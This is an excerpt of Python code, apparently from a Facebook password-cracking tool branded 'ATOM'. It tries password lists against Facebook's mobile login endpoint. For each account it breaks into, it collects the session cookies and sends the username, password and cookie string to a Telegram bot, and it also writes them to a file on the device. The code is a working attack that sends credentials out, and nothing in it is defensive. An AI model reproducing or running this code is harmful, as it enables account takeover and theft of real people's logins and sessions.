  ...
  for ps in pwv:
   ...
   if 'm_page_voice' in log_cookies:
    ...
    if 'live' in reqx:
            ...
            statusok = (f" {user} | {ps} | {coki} ")
            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
            open('/sdcard/ATOM-M4-live-OKb.txt','a').write(user+'|'+ps+'|'+coki+'\n')
            ok+=1 
            break
    if 'die' in reqx:
            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
   ...
   if 'xs' in log_cookies:
    ...
    if 'live' in reqx:
            ...
            statusok = (f" {user} | {ps} | {coki} ")
            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
            open('/sdcard/ATOM-M4-live-OKa.txt','a').write(user+'|'+ps+'|'+coki+'\n')
            ok+=1 
            break
    if 'die' in reqx:
            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
 ...
 try:
  for ps in pwv:
   ...
   header_freefb =  {
    ...
    'Pragma': 'no-cache',
    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
   lo = session.post('https://x.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028&',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
